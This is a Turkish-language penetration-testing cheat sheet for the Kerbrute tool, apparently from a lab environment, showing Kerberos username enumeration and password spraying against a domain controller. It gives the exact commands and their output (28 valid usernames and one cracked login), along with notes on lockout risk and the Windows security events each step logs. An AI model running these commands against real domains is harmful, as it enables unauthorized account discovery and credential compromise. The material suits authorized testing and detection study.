# Kerbrute

## Username Enumeration

!!! warning

    * Bu işlem hesapları kilitlemez.
    * Bu işlem [4768(S, F): A Kerberos authentication ticket (TGT) was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768) olayı üretir.
    * Hata kodu [KDC_ERR_C_PRINCIPAL_UNKNOWN](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768#table-2-kerberos-ticket-flags) ise kullanıcı adı mevcut değil.
    * Hata kodu [KDC_ERR_PREAUTH_REQUIRED](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768#table-2-kerberos-ticket-flags) ise kullanıcı adı mevcut.

```sh
my@attack:~$ kerbrute userenum --dc 172.16.8.3 -d INLANEFREIGHT.LOCAL usernames.txt
```

```output title="Output"
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 01/31/25 - Ronnie Flathers @ropnop

2025/01/31 06:05:05 >  Using KDC(s):
2025/01/31 06:05:05 >   172.16.8.3:88

2025/01/31 06:05:10 >  [+] VALID USERNAME:  debra.rogers@INLANEFREIGHT.LOCAL
2025/01/31 06:05:10 >  [+] VALID USERNAME:  frank.evans@INLANEFREIGHT.LOCAL
2025/01/31 06:05:10 >  [+] VALID USERNAME:  alan.powell@INLANEFREIGHT.LOCAL
2025/01/31 06:05:10 >  [+] VALID USERNAME:  carly.moran@INLANEFREIGHT.LOCAL
2025/01/31 06:05:10 >  [+] VALID USERNAME:  alison.herbert@INLANEFREIGHT.LOCAL
2025/01/31 06:05:10 >  [+] VALID USERNAME:  dawn.berry@INLANEFREIGHT.LOCAL
2025/01/31 06:05:13 >  [+] VALID USERNAME:  diane.butcher@INLANEFREIGHT.LOCAL
2025/01/31 06:05:13 >  [+] VALID USERNAME:  ian.brown@INLANEFREIGHT.LOCAL
2025/01/31 06:05:13 >  [+] VALID USERNAME:  bernard.hughes@INLANEFREIGHT.LOCAL
2025/01/31 06:05:13 >  [+] VALID USERNAME:  charlotte.adams@INLANEFREIGHT.LOCAL
2025/01/31 06:05:15 >  [+] VALID USERNAME:  jake.kirk@INLANEFREIGHT.LOCAL
2025/01/31 06:05:15 >  [+] VALID USERNAME:  jeffrey.williams@INLANEFREIGHT.LOCAL
2025/01/31 06:05:15 >  [+] VALID USERNAME:  kyle.watson@INLANEFREIGHT.LOCAL
2025/01/31 06:05:15 >  [+] VALID USERNAME:  jemma.stephens@INLANEFREIGHT.LOCAL
2025/01/31 06:05:15 >  [+] VALID USERNAME:  jordan.francis@INLANEFREIGHT.LOCAL
2025/01/31 06:05:15 >  [+] VALID USERNAME:  julia.simmons@INLANEFREIGHT.LOCAL
2025/01/31 06:05:18 >  [+] VALID USERNAME:  michelle.hussain@INLANEFREIGHT.LOCAL
2025/01/31 06:05:18 >  [+] VALID USERNAME:  leonard.shaw@INLANEFREIGHT.LOCAL
2025/01/31 06:05:18 >  [+] VALID USERNAME:  mark.green@INLANEFREIGHT.LOCAL
2025/01/31 06:05:18 >  [+] VALID USERNAME:  maurice.kaur@INLANEFREIGHT.LOCAL
2025/01/31 06:05:20 >  [+] VALID USERNAME:  natasha.brown@INLANEFREIGHT.LOCAL
2025/01/31 06:05:20 >  [+] VALID USERNAME:  owen.brown@INLANEFREIGHT.LOCAL
2025/01/31 06:05:20 >  [+] VALID USERNAME:  daniel.whitehead@INLANEFREIGHT.LOCAL
2025/01/31 06:05:20 >  [+] VALID USERNAME:  patrick.ross@INLANEFREIGHT.LOCAL
2025/01/31 06:05:20 >  [+] VALID USERNAME:  annette.jackson@INLANEFREIGHT.LOCAL
2025/01/31 06:05:20 >  [+] VALID USERNAME:  ross.holland@INLANEFREIGHT.LOCAL
2025/01/31 06:05:23 >  [+] VALID USERNAME:  sandra.murphy@INLANEFREIGHT.LOCAL
2025/01/31 06:05:23 >  [+] VALID USERNAME:  stephen.lawson@INLANEFREIGHT.LOCAL
2025/01/31 06:07:01 >  Done! Tested 216 usernames (28 valid) in 115.949 seconds
```

## Password Spraying

!!! danger

    * Bu işlem hesapları kilitleyebilir.
    * Bu işlem [4768(S, F): A Kerberos authentication ticket (TGT) was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768) olayı üretir.
    * Bu işlem [4771(F): Kerberos pre-authentication failed](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4771) olayı üretir.

```sh
my@attack:~$ kerbrute passwordspray --dc 172.16.8.3 -d INLANEFREIGHT.LOCAL valid_usernames.txt dolphin
```

```output title="Output"
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 01/31/25 - Ronnie Flathers @ropnop

2025/01/31 06:10:12 >  Using KDC(s):
2025/01/31 06:10:12 >   172.16.8.3:88

2025/01/31 06:10:37 >  [+] VALID LOGIN:  daniel.whitehead@INLANEFREIGHT.LOCAL:dolphin
2025/01/31 06:12:21 >  Done! Tested 216 logins (1 successes) in 128.972 seconds
```
